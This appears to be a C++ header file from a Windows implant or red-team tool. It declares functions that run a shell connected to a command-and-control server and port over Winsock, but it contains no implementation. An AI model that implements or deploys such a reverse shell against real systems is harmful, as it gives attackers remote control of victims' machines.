#pragma once
#pragma comment(lib, "Ws2_32.lib") 
#include "common.hpp"
#include <winsock2.h>
#include <ws2tcpip.h>

#include "Logger.hpp"

void RunShell(char* C2Server, int C2Port);
void RunShellAsync(char* C2Server, int C2Port);

extern Logger logger;